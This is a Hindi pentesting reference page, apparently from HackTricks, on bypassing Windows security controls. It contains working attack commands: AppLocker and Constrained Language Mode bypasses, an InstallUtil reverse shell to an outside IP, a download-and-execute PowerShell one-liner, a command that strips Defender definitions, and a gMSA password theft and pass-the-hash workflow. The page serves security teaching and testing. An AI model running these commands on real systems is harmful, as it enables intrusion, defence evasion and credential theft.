# Windows सुरक्षा नियंत्रण

{{#include ../../banners/hacktricks-training.md}}

## AppLocker नीति

Application whitelist, स्वीकृत सॉफ़्टवेयर एप्लिकेशन या executable की एक सूची होती है, जिन्हें सिस्टम पर मौजूद रहने और चलने की अनुमति होती है। इसका उद्देश्य environment को हानिकारक malware और ऐसे unapproved software से सुरक्षित रखना है, जो किसी संगठन की विशिष्ट व्यावसायिक ज़रूरतों के अनुरूप नहीं होते।

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) Microsoft का **application whitelisting solution** है और यह system administrators को यह नियंत्रित करने देता है कि **users कौन-से applications और files चला सकते हैं**। यह executables, scripts, Windows installer files, DLLs, packaged apps और packed app installers पर **सूक्ष्म नियंत्रण** प्रदान करता है।\
संगठनों में **cmd.exe और PowerShell.exe को block करना** और कुछ directories में write access रोकना आम है, **लेकिन इन सभी प्रतिबंधों को bypass किया जा सकता है**।

### जांच

जांचें कि कौन-सी files/extensions blacklist/whitelist में हैं:

```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```

यह registry path AppLocker द्वारा लागू किए गए कॉन्फ़िगरेशन और नीतियाँ रखता है, जिससे सिस्टम पर लागू नियमों के मौजूदा सेट की समीक्षा की जा सकती है:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker नीति को bypass करने के लिए उपयोगी **लिखने योग्य फ़ोल्डर**: यदि AppLocker `C:\Windows\System32` या `C:\Windows` के अंदर किसी भी चीज़ को execute करने की अनुमति देता है, तो वहाँ **लिखने योग्य फ़ोल्डर** मौजूद हैं जिनका उपयोग आप इसे **bypass** करने के लिए कर सकते हैं।

```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```

- आम तौर पर **trusted** [**"LOLBAS's"**](https://lolbas-project.github.io/) binaries भी AppLocker को bypass करने में उपयोगी हो सकते हैं।
- **खराब तरीके से लिखे गए rules को भी bypass किया जा सकता है**
  - उदाहरण के लिए, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** के लिए, आप कहीं भी **`allowed` नाम का folder** बना सकते हैं और उसे अनुमति मिल जाएगी।
  - Organizations अक्सर **`%System32%\WindowsPowerShell\v1.0\powershell.exe` executable को block करने पर** ध्यान देते हैं, लेकिन [**PowerShell executable के अन्य locations**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) को भूल जाते हैं, जैसे `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` या `PowerShell_ISE.exe`।
- **DLL enforcement बहुत कम ही enabled होता है**, क्योंकि इससे system पर अतिरिक्त load पड़ सकता है और यह सुनिश्चित करने के लिए काफी testing करनी पड़ती है कि कुछ भी break न हो। इसलिए, **backdoors के रूप में DLLs का इस्तेमाल AppLocker को bypass करने में मदद करेगा**।
- आप किसी भी process में **Powershell** code **execute** करने और AppLocker को bypass करने के लिए [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का इस्तेमाल कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Credentials Storage

### Security Accounts Manager (SAM)

इस file में local credentials मौजूद होते हैं; passwords hashed होते हैं।

### Local Security Authority (LSA) - LSASS

Single Sign-On के लिए इस subsystem की **memory** में **credentials** (hashed) **सहेजे** जाते हैं।\
**LSA**, local **security policy** (password policy, users की permissions...), **authentication**, **access tokens**... को administrate करता है।\
Local login के लिए **SAM** file में दिए गए credentials को **check** करने और domain user को authenticate करने के लिए **domain controller से बात** करने का काम LSA करता है।

**Credentials**, **process LSASS** में **सहेजे** जाते हैं: Kerberos tickets, NT और LM hashes, आसानी से decrypt किए जा सकने वाले passwords।

### LSA secrets

LSA कुछ credentials को disk पर सहेज सकता है:

- Active Directory के computer account का password (जब domain controller तक पहुंच न हो)।
- Windows services के accounts के passwords
- Scheduled tasks के passwords
- अन्य (IIS applications के passwords...)

### NTDS.dit

यह Active Directory का database है। यह केवल Domain Controllers में मौजूद होता है।

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender) एक Antivirus है, जो Windows 10 और Windows 11 के साथ-साथ Windows Server के कुछ versions में उपलब्ध है। यह **`WinPEAS`** जैसे आम pentesting tools को **block** करता है। हालांकि, इन protections को **bypass करने के तरीके** मौजूद हैं।

### जांच

**Defender** का **status** जांचने के लिए, आप PS cmdlet **`Get-MpComputerStatus`** execute कर सकते हैं (यह जानने के लिए **`RealTimeProtectionEnabled`** की value जांचें कि यह active है या नहीं):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

इसे enumerate करने के लिए आप यह भी run कर सकते हैं:

```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

## Encrypted File System (EFS)

EFS फ़ाइलों को encryption के ज़रिए सुरक्षित करता है और इसके लिए **File Encryption Key (FEK)** नाम की **symmetric key** का उपयोग करता है। यह key यूज़र की **public key** से encrypt की जाती है और encrypted फ़ाइल के $EFS **alternative data stream** में संग्रहीत होती है। Decryption की ज़रूरत पड़ने पर, यूज़र के digital certificate की संबंधित **private key** का उपयोग करके $EFS stream से FEK को decrypt किया जाता है। अधिक जानकारी [यहाँ](https://en.wikipedia.org/wiki/Encrypting_File_System) मिल सकती है।

यूज़र की पहल के बिना **decryption** होने की स्थितियाँ:

- जब फ़ाइलों या फ़ोल्डरों को किसी non-EFS file system, जैसे [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table), में ले जाया जाता है, तो वे अपने-आप decrypt हो जाते हैं।
- SMB/CIFS protocol के ज़रिए network पर भेजी जाने वाली encrypted फ़ाइलें transmission से पहले decrypt कर दी जाती हैं।

यह encryption method मालिक को encrypted फ़ाइलों तक **पारदर्शी पहुँच** देता है। हालाँकि, केवल मालिक का password बदलकर login करने से फ़ाइलें decrypt नहीं होंगी।

**मुख्य बातें**:

- EFS एक symmetric FEK का उपयोग करता है, जिसे यूज़र की public key से encrypt किया जाता है।
- FEK तक पहुँचने के लिए decryption में यूज़र की private key का उपयोग होता है।
- कुछ स्थितियों में, जैसे FAT32 में copy करने या network पर भेजने पर, फ़ाइलें अपने-आप decrypt हो जाती हैं।
- मालिक बिना किसी अतिरिक्त कदम के encrypted फ़ाइलों तक पहुँच सकता है।

### EFS की जानकारी जाँचें

जाँचें कि किसी **यूज़र** ने इस **service** का **उपयोग किया है या नहीं**—इसके लिए देखें कि यह path मौजूद है या नहीं:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

`cipher /c \<file>\` का उपयोग करके जाँचें कि फ़ाइल तक **किसकी** **पहुँच** है।  
किसी फ़ोल्डर के अंदर `cipher /e` और `cipher /d` का उपयोग करके सभी फ़ाइलों को **encrypt** और **decrypt** भी किया जा सकता है।

### EFS फ़ाइलों को decrypt करना

#### Authority System के रूप में चलना

इस तरीके के लिए ज़रूरी है कि **victim user** host पर कोई **process** **चला रहा हो**। अगर ऐसा है, तो `meterpreter` sessions का उपयोग करके आप यूज़र के process के token का impersonation कर सकते हैं (`incognito` से `impersonate_token`)। या आप सीधे यूज़र के process पर `migrate` कर सकते हैं।

#### यूज़र का password पता होना

Mimikatz में बताया गया है कि यूज़र का certificate/private key material कैसे import करें और password पता होने पर EFS-सुरक्षित फ़ाइलों को कैसे decrypt करें।<sup>[[6]](#references)</sup>

## Group Managed Service Accounts (gMSA)

Microsoft ने IT infrastructures में service accounts का प्रबंधन आसान बनाने के लिए **Group Managed Service Accounts (gMSA)** विकसित किए। पारंपरिक service accounts के विपरीत, जिनमें अक्सर "**Password never expire**" setting enabled होती है, gMSA ज़्यादा सुरक्षित और प्रबंधनीय समाधान देते हैं:

- **Automatic Password Management**: gMSA एक जटिल, 240-character password का उपयोग करते हैं, जो domain या computer policy के अनुसार अपने-आप बदलता रहता है। इस प्रक्रिया को Microsoft की Key Distribution Service (KDC) संभालती है, जिससे password को मैन्युअल रूप से अपडेट करने की ज़रूरत नहीं पड़ती।
- **बेहतर सुरक्षा**: इन accounts को lockout नहीं किया जा सकता और इनका उपयोग interactive logins के लिए नहीं किया जा सकता, जिससे इनकी सुरक्षा बढ़ती है।
- **एकाधिक hosts के लिए समर्थन**: gMSA को कई hosts पर साझा किया जा सकता है, इसलिए ये कई servers पर चलने वाली services के लिए आदर्श हैं।
- **Scheduled Task की सुविधा**: managed service accounts के विपरीत, gMSA scheduled tasks चलाने का समर्थन करते हैं।
- **आसान SPN प्रबंधन**: computer के sAMaccount details या DNS name में बदलाव होने पर system Service Principal Name (SPN) को अपने-आप अपडेट करता है, जिससे SPN प्रबंधन आसान हो जाता है।

gMSA के passwords LDAP property _**msDS-ManagedPassword**_ में संग्रहीत होते हैं और Domain Controllers (DCs) द्वारा हर 30 दिन में अपने-आप reset किए जाते हैं। यह password, [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) नाम का एक encrypted data blob है, जिसे केवल authorized administrators और वे servers प्राप्त कर सकते हैं जिन पर gMSA installed हैं—इससे एक सुरक्षित environment सुनिश्चित होता है। इस जानकारी तक पहुँचने के लिए LDAPS जैसे secured connection की ज़रूरत होती है, या connection को 'Sealing & Secure' के साथ authenticate किया जाना चाहिए।

![gMSA password प्राप्त करने के लिए NTLM authentication को relay करना](../../images/asd1.png)<sup>[[1]](#references)</sup>

आप [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup> से यह password पढ़ सकते हैं।

```
/GMSAPasswordReader --AccountName jkohler
```

[**संग्रहीत मूल शोध में अधिक जानकारी पाएँ**](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/).<sup>[[1]](#references)</sup>

यही शोध बताता है कि जब relayed principal को `msDS-ManagedPassword` पढ़ने की अनुमति हो, तो **NTLM relay attack** से **gMSA password** प्राप्त किया जा सकता है।<sup>[[1]](#references)</sup>

### gMSA managed password पढ़ने के लिए ACL chaining का दुरुपयोग (GenericAll -> ReadGMSAPassword)

कई environments में, कम विशेषाधिकार वाले users, misconfigured object ACLs का दुरुपयोग करके DC compromise किए बिना gMSA secrets तक pivot कर सकते हैं:<sup>[[3]](#references)</sup>

- जिस group को आप control कर सकते हैं (जैसे GenericAll/GenericWrite के ज़रिए), उसे किसी gMSA पर `ReadGMSAPassword` की अनुमति दी गई हो।
- उस group में खुद को जोड़कर, आप LDAP के ज़रिए gMSA का `msDS-ManagedPassword` blob पढ़ने का अधिकार प्राप्त करते हैं और उपयोगी NTLM credentials निकाल सकते हैं।

सामान्य workflow:

1) BloodHound से path खोजें और अपने foothold principals को Owned के रूप में चिह्नित करें। इस तरह के edges देखें:
   - GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) जिस intermediate group को आप control करते हैं, उसमें खुद को जोड़ें (bloodyAD के साथ उदाहरण):

```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```

3) LDAP के ज़रिए gMSA managed password पढ़ें और NTLM hash निकालें। NetExec `msDS-ManagedPassword` को निकालने और NTLM में बदलने की प्रक्रिया स्वचालित करता है:

```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```

4) NTLM hash का उपयोग करके gMSA के रूप में Authenticate करें (plaintext की आवश्यकता नहीं है)। यदि account Remote Management Users में है, तो WinRM सीधे काम करेगा:

```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```

नोट्स:
- `msDS-ManagedPassword` के LDAP reads के लिए sealing (जैसे LDAPS/sign+seal) ज़रूरी है। Tools इसे अपने आप संभालते हैं।
- gMSAs को अक्सर WinRM जैसे local rights दिए जाते हैं; lateral movement की योजना बनाने के लिए group membership (जैसे Remote Management Users) validate करें।
- अगर आपको केवल blob चाहिए ताकि आप खुद NTLM compute कर सकें, तो MSDS-MANAGEDPASSWORD_BLOB structure देखें।

एक अन्य ACL path, gMSA object पर write grant होना है। `msDS-GroupMSAMembership` वह security descriptor है जिसका उपयोग यह तय करने के लिए होता है कि किन principals को managed password retrieve करने की अनुमति है। इसका schema GUID `888eedd6-ce04-df40-b462-b8a50e41ba38` है। आपके नियंत्रण वाले किसी group के लिए उस attribute पर सटीक `WriteProperty` ACE, reader list बदलने का एक संभावित तरीका हो सकता है; यह पहले से reader list में शामिल होने से अलग है। इस path को इस्तेमाल करने योग्य मानने से पहले पूरी DACL, deny और inherited ACEs, और effective permissions की पुष्टि करें। Password read करने की कोशिश से पहले नई group membership के लिए token/session refresh करना भी ज़रूरी है।<sup>[[7]](#references)</sup>



## LAPS

**Local Administrator Password Solution (LAPS)**, जिसे [Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) से download किया जा सकता है, local Administrator passwords को manage करने की सुविधा देता है। ये passwords **randomized**, unique और **नियमित रूप से बदले जाने वाले** होते हैं, और Active Directory में centrally store किए जाते हैं। इन passwords तक पहुँच ACLs के ज़रिए authorized users तक सीमित होती है। पर्याप्त permissions मिलने पर local admin passwords read किए जा सकते हैं।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) PowerShell का प्रभावी ढंग से उपयोग करने के लिए ज़रूरी कई features को **सीमित कर देता है**; जैसे COM objects को block करना, केवल approved .NET types की अनुमति देना, XAML-based workflows, PowerShell classes आदि।

### **जाँच**

```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```

### Bypass

```bash
#Easy bypass
Powershell -version 2
```

वर्तमान Windows versions पर वह bypass अब काम नहीं करता, लेकिन आप [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) का उपयोग कर सकते हैं।\
**इसे compile करने के लिए आपको** **_Add a Reference_** -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` जोड़ना पड़ सकता है और **project को .Net4.5 पर बदलना होगा**।

#### सीधा bypass:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```

#### Reverse shell:

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```

आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग किसी भी process में **Powershell** code execute करने और constrained mode को bypass करने के लिए कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS Execution Policy

डिफ़ॉल्ट रूप से यह **restricted** पर सेट होता है। इस policy को bypass करने के मुख्य तरीके:

```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

और अधिक जानकारी [यहाँ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup> मिल सकती है।

## Security Support Provider Interface (SSPI)

यह एक API है जिसका उपयोग users को authenticate करने के लिए किया जा सकता है।

SSPI दो communicating machines के लिए एक उपयुक्त authentication protocol चुनता है और उपलब्ध होने पर Kerberos को प्राथमिकता देता है। ये protocols Security Support Providers (SSPs) द्वारा लागू किए जाते हैं, जो Windows में DLLs के रूप में install होते हैं; दोनों peers को negotiated provider support करना चाहिए।

### Main SSPs

- **Kerberos**: पसंदीदा विकल्प
  - %windir%\Windows\System32\kerberos.dll
- **NTLMv1** और **NTLMv2**: compatibility के लिए
  - %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web servers और LDAP के लिए; password, MD5 hash के रूप में होता है
  - %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL और TLS
  - %windir%\Windows\System32\Schannel.dll
- **Negotiate**: उपयोग किए जाने वाले protocol (Kerberos या NTLM) को negotiate करने के लिए; डिफ़ॉल्ट रूप से Kerberos चुना जाता है
  - %windir%\Windows\System32\lsasrv.dll

#### Negotiation में कई methods या केवल एक method उपलब्ध हो सकता है।

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक feature है, जो **elevated activities के लिए consent prompt** सक्षम करता है।

{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [gMSA के लिए Relaying – cube0x0 (Internet Archive)](https://web.archive.org/web/20200724233424/https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: rights chaining के जरिए WinRM पर gMSA](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – AppLocker और PowerShell Constrained Language Mode को Bypass करना](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode)
- [5] [NetSPI – PowerShell Execution Policy को Bypass करने के 15 तरीके](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ EFS files को decrypt करना](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)
- [7] [Microsoft - ms-DS-GroupMSAMembership attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
{{#include ../../banners/hacktricks-training.md}}
